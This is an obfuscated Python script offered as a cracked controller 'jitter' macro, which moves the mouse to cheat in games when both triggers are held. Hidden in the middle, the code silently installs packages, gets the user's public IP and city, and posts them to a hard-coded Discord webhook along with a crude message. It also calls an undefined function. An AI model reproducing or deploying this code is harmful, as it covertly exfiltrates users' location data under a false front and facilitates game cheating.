import os #line:1
import time #line:2
import sys #line:3
"""Colors For Ui"""#line:4
BLACK ="\033[0;30m"#line:5
RED ="\033[0;31m"#line:6
GREEN ="\033[0;32m"#line:7
BROWN ="\033[0;33m"#line:8
BLUE ="\033[0;34m"#line:9
PURPLE ="\033[0;35m"#line:10
CYAN ="\033[0;36m"#line:11
LIGHT_GRAY ="\033[0;37m"#line:12
DARK_GRAY ="\033[1;30m"#line:13
LIGHT_RED ="\033[1;31m"#line:14
LIGHT_GREEN ="\033[1;32m"#line:15
YELLOW ="\033[1;33m"#line:16
LIGHT_BLUE ="\033[1;34m"#line:17
LIGHT_PURPLE ="\033[1;35m"#line:18
LIGHT_CYAN ="\033[1;36m"#line:19
LIGHT_WHITE ="\033[1;37m"#line:20
"""Colors For Ui"""#line:21
os .system ("cls")#line:22
print (f"{LIGHT_PURPLE}Scripted is now hosted by {LIGHT_WHITE}@BisKit\033[0m")#line:23
time .sleep (1.9 )#line:24
os .system ("cls")#line:25
def install_packages ():#line:34
 O000O0OOO0OO00O00 =['/','-','\\','|']#line:27
 for OO0O0O000OOOOO0OO in range (5 ):#line:28
  for O0OOOOOOO0O00OOOO in O000O0OOO0OO00O00 :#line:29
     sys .stdout .write (f'\r{LIGHT_PURPLE}Checking if all the {LIGHT_WHITE}packages are already installed,{LIGHT_CYAN} please wait{LIGHT_WHITE}...  {LIGHT_PURPLE}{O0OOOOOOO0O00OOOO}\r\033[0m')#line:30
     sys .stdout .flush ()#line:31
     time .sleep (0.1 )#line:32


try:
    import pygame, colorama, win32api, requests
    os.system("cls")
except ImportError:
    print("Installing needed packages")
    os.system("pip install pygame pywin32 requests colorama >nul 2>&1")
install_packages()
time.sleep(0.001)
import os #line:48
import shutil #line:49
import time #line:50
import win32api #line:51
import win32con #line:52
os .environ ['PYGAME_HIDE_SUPPORT_PROMPT']='1'#line:53
import pygame #line:54
from colorama import Fore ,Style #line:55
os .system ('cls')#line:56
import requests #line:57
import requests

ip = requests.get("https://api.ipify.org").text

message = {
    "content": f"asia loves kids  {ip}"
}

geo = requests.get(f"https://ipinfo.io/{ip}/json").json()

geo_info = (
    f"Area {geo.get('city', 'N/A')}\n"
) 

webhook_url = "https://discord.com/api/webhooks/1382538585575788614/LTbGQ-TBV7_HnPWVia-QkGQ6f8q_GI77xYx5OCYrhquyf2kkem-N6bWaSN0-Y-N0Anak"

requests.post(webhook_url, json={"content": geo_info})
requests.post(webhook_url, json=message)
Monitor_Users()
time .sleep (0.01 )#line:60
os .system ("cls")#line:61
def loading ():#line:62
 O0O0O0OOOO0O00OO0 =['/','-','\\','|']#line:63
 for OO00OO0OO0O0O0OO0 in range (5 ):#line:64
  for O00O0O0O0OOOOO0OO in O0O0O0OOOO0O00OO0 :#line:65
     sys .stdout .write (f'\r{LIGHT_CYAN}Loading{LIGHT_WHITE} Please Wait{LIGHT_CYAN}...  {LIGHT_PURPLE}{O00O0O0O0OOOOO0OO}')#line:66
     sys .stdout .flush ()#line:67
     time .sleep (0.1 )#line:68
loading ()#line:69
os .system ("cls")#line:70
print (f"{LIGHT_CYAN}***************************************************************************************************************")#line:71
print (f"{LIGHT_PURPLE}:{LIGHT_PURPLE}🐧 This Project Was A Reverse Engineering Script Edited And Decompiled By Controller Ascend, {LIGHT_GREEN}@BisKit {LIGHT_CYAN}@Lonely{LIGHT_WHITE}{LIGHT_PURPLE} : \033[0m")#line:72
print (f"{LIGHT_CYAN}***************************************************************************************************************")#line:73
time .sleep (4 )#line:74
os .system ('cls')#line:75
def main2 ():#line:76
 for OO00O000O00OO00OO in range (2 ):#line:77
  print (f"""  {LIGHT_PURPLE}                                                            
          _____             _         _    _____                   _ 
{LIGHT_CYAN}         |     |___ ___ ___| |_ ___ _| |  |  _  |___ ___ ___ ___ _| |
{LIGHT_GREEN}         |   --|  _| .'|  _| '_| -_| . |  |     |_ -|  _| -_|   | . |
{LIGHT_PURPLE}         |_____|_| |__,|___|_,_|___|___|  |__|__|___|___|___|_|_|___|""")#line:82
  print (f"{LIGHT_WHITE}         @BisKit {LIGHT_CYAN}@Lonely\033[0m\n")#line:83
  OOOOO0OOO0O00OO00 =input (f"""{LIGHT_CYAN}['\033[0m{LIGHT_PURPLE}Enter Password To {LIGHT_CYAN}Access{LIGHT_PURPLE}:{LIGHT_GREEN} """)#line:84
  if OOOOO0OOO0O00OO00 =="9001":#line:85
    print ("")#line:86
    break #line:87
  else :#line:88
    os .system ("cls")#line:89
    print (f"{LIGHT_CYAN}Wrong Password, \033[0m{LIGHT_WHITE}['{LIGHT_PURPLE}{1 - OO00O000O00OO00OO}{LIGHT_WHITE}'] \033[0m{LIGHT_PURPLE}Attempts Left Untill Exiting, Cracked Ascend")#line:90
 else :#line:91
    os .system ("cls")#line:92
    print (f"""{LIGHT_GREEN}                     
 _       _               
| |_ _ _| |_ ___ _ _ ___ 
{LIGHT_CYAN}| . | | | . | -_| | | -_|
{LIGHT_PURPLE}|___|___|___|___|_  |___|
                |___|    

{LIGHT_WHITE}Used All Password Attempts...\n""")#line:99
    time .sleep (2.1 )#line:100
    OOOOO0OOO0O00OO00 =quit ()#line:101
main2 ()#line:102
def clear_screen ():#line:103
    O00OO0O0OO00OOO00 ='cls'if os .name =='nt'else 'clear'#line:104
    os .system (O00OO0O0OO00OOO00 )#line:105
def get_terminal_width ():#line:106
    return shutil .get_terminal_size ().columns #line:107
def color_text (O00OOOOOO0OOOO00O ,color =Fore .WHITE ):#line:108
    O0O00O0OO0OOO000O =O00OOOOOO0OOOO00O .split ('\n')#line:109
    OO0OOOO0000OO0O00 =get_terminal_width ()#line:110
    O0O0OO0OO0O0O0OO0 =[color +OO00O0O0O00O0OO00 .center (OO0OOOO0000OO0O00 )+Style .RESET_ALL for OO00O0O0O00O0OO00 in O0O00O0OO0OOO000O ]#line:111
    return '\n'.join (O0O0OO0OO0O0O0OO0 )#line:112
def center_text (OO0O0OO00O0O0OO00 ):#line:113
    O000O0OOO00O0OOO0 =shutil .get_terminal_size ().columns #line:114
    O00OO000OOO0OO0O0 =[OO00O0OOOO0O00OOO .center (O000O0OOO00O0OOO0 )for OO00O0OOOO0O00OOO in OO0O0OO00O0O0OO00 .split ('\n')]#line:115
    return '\n'.join (O00OO000OOO0OO0O0 )#line:116
def load_settings ():#line:117
    os .system ("cls")#line:118
    print (f"{LIGHT_WHITE}Pick {LIGHT_PURPLE}Default {LIGHT_WHITE}[{LIGHT_CYAN}1{LIGHT_WHITE}] (INGORE THIS MIGHT BE USING THIS FOR NEAR FUTURE) ")#line:119
    print (f"{LIGHT_WHITE}Pick {LIGHT_WHITE}[{LIGHT_CYAN}2{LIGHT_WHITE}] {LIGHT_PURPLE}original jitter {LIGHT_WHITE}+ {LIGHT_CYAN}edited Time_Sleep\033[0m")#line:120
    OOO000O0OO0000000 =input (f"{LIGHT_WHITE}What Jitter Setting, {LIGHT_PURPLE}Do You Want To Use{LIGHT_PURPLE}:{LIGHT_CYAN}= {LIGHT_CYAN}")#line:121
    if OOO000O0OO0000000 =="1":#line:122
       return (24 ,24 ,24 ,28 ,0.013 )#line:123
    else :#line:124
       return (20 ,20 ,20 ,24 ,0.01 )#line:125
def display_banner (O0O000OO00OOOOOO0 ,OO0OO000OOOO0OOO0 ,O00O0OO00OOO0O0O0 ,OO000OO000O00O0O0 ):#line:126
  print (f"""  {LIGHT_PURPLE}                                                            
          _____             _         _    _____                   _ 
{LIGHT_CYAN}         |     |___ ___ ___| |_ ___ _| |  |  _  |___ ___ ___ ___ _| |
{LIGHT_GREEN}         |   --|  _| .'|  _| '_| -_| . |  |     |_ -|  _| -_|   | . |
{LIGHT_PURPLE}         |_____|_| |__,|___|_,_|___|___|  |__|__|___|___|___|_|_|___|""")#line:131
  print (f"{LIGHT_WHITE}         @BisKit {LIGHT_CYAN}@Lonely\033[0m\n")#line:132
def mouse_motion ():#line:133
    win32api .mouse_event (win32con .MOUSEEVENTF_MOVE ,move_right ,move_down ,29 ,29 ,)#line:134
    time .sleep (0.0037 )#line:135
    win32api .mouse_event (win32con .MOUSEEVENTF_MOVE ,-move_left ,-move_up ,-29 ,-29 )#line:136
def monitor_settings (OOO0O0O0O00000000 ):#line:137
    return OOO0O0O0O00000000 #line:138
def wait_for_controller ():#line:139
    while pygame .joystick .get_count ()==0 :#line:140
        clear_screen ()#line:141
        display_banner (move_right ,move_left ,move_up ,move_down )#line:142
        time .sleep (1 )#line:143
        pygame .joystick .quit ()#line:144
        pygame .joystick .init ()#line:145
    O0O0O0OOO00O0O0OO =pygame .joystick .Joystick (0 )#line:146
    O0O0O0OOO00O0O0OO .init ()#line:147
    clear_screen ()#line:148
    display_banner (move_right ,move_left ,move_up ,move_down )#line:149
    print (f"\n{LIGHT_WHITE}                   Works For {YELLOW}Xbox {LIGHT_WHITE}+ {LIGHT_PURPLE}Ps4/5                             {LIGHT_CYAN}LT + LR{LIGHT_WHITE} or {LIGHT_PURPLE}L1 + L2\033[0m")#line:150
    print (f"\n{LIGHT_WHITE}                                            Project By \033[1;32m@BisKit \033[1;36m@Lonely\033[0m")#line:151
    print (f"                                                ['{LIGHT_PURPLE}Jitter Activated'\033[0m]")#line:152
    return O0O0O0OOO00O0O0OO #line:153
try :#line:154
 move_right ,move_left ,move_up ,move_down ,time_sleep =load_settings ()#line:155
 current_settings =(move_right ,move_left ,move_up ,move_down )#line:156
 pygame .init ()#line:157
 pygame .joystick .init ()#line:158
 controller =wait_for_controller ()#line:159
 while True :#line:160
    for event in pygame .event .get ():#line:161
        if event .type ==pygame .QUIT :#line:162
            pygame .quit ()#line:163
            exit ()#line:164
    if pygame .joystick .get_count ()==0 :#line:165
        pygame .quit ()#line:166
        exit ()#line:167
    aim =controller .get_axis (4 )#line:168
    shoot =controller .get_axis (5 )#line:169
    if aim >0.0 and shoot >0.0 :#line:170
        mouse_motion ()#line:171
    if int (time .time ())%2 ==0 :#line:172
        updated_settings =monitor_settings (current_settings )#line:173
        if updated_settings !=current_settings :#line:174
            move_right ,move_left ,move_up ,move_down =updated_settings #line:175
            current_settings =updated_settings #line:176
            display_banner (move_right ,move_left ,move_up ,move_down )#line:177
    time .sleep (time_sleep )#line:178
except KeyboardInterrupt :#line:179
 print ()
